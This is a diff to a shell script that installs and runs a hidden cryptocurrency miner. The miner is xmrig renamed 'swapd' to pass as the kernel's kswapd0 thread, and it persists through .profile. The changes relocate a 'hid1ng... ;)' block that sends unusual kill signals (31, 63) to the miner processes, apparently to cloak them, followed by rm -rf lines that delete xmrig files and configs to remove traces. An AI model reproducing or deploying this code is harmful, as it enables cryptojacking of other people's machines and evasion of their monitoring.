@@ -360,7 +360,7 @@ if ! sudo -n true 2>/dev/null; then
     echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
-  bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -372,7 +372,7 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
-    bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -520,22 +520,6 @@ else
    sysctl -w vm.nr_hugepages=$(nproc)
 fi
 
-echo "[*] hid1ng... ;)"
-
-kill -31 $(pgrep -f -u root config.json)
-
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ;
-#kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
-
-kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` :
-#kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
-
-# echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
-
-rm -rf $HOME/xmrig* ; rm -rf xmrig* ; apt autoremove -y ; yum autoremove -y;
-
-rm -rf xmrig* config.json*
-
 #cat << 'EOF' > "$HOME/.swapd/check_swapd.sh"
 #    #!/bin/bash
 #
@@ -621,10 +605,20 @@ else
   echo "Failed to start swapd."
 fi
 
+echo "[*] hid1ng... ;)"
+
 kill -31 $(pgrep -f -u root config.json)
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
-kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+
+kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ;
+#kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
+
+kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` :
+#kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
+
+# echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
+
+rm -rf $HOME/xmrig* ; rm -rf xmrig* ; apt autoremove -y ; yum autoremove -y;
+
+rm -rf $HOME/xmrig* $HOME/config.json*
 
 echo "[*] Setup complete"
